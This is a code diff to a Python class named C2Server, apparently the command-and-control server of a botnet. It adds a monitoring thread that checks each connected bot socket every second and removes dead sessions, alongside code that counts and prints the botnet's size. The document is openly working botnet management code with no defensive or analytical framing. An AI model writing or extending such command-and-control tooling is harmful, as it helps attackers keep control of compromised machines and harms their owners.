@@ -28,6 +28,7 @@ class C2Server:
 
         # non-blocking
         threading.Thread(target=self.__accept_bot).start()
+        threading.Thread(target=self.__alive_monitoring).start()
 
     def display(self):
         if not self.__active:
@@ -40,6 +41,26 @@ class C2Server:
 
         print 'Botnet Size: {}'.format(len(self.botnet))
 
+    def __alive_monitoring(self):
+        while self.__active:
+            time.sleep(1)
+            for session in self.botnet:
+                try:
+                    session.settimeout(1)
+                    if not session.recv(1):
+                        self.__kill_bot(session)
+                except socket.timeout:
+                    pass
+                except:
+                    self.__kill_bot(session)
+
+    def __kill_bot(self, session):
+        try:
+            session.shutdown(socket.SHUT_RDWR)
+            session.close()
+        except: pass
+        del self.botnet[self.botnet.index(session)]
+
     def __add_bot(self, session):
         self.botnet.append(session)
 
@@ -48,4 +69,5 @@ class C2Server:
             try:
                 session, ip = self.__server.accept()
                 threading.Thread(target=self.__add_bot, args=[session]).start()
-            except socket.timeout:pass
+            except socket.timeout:
+                pass
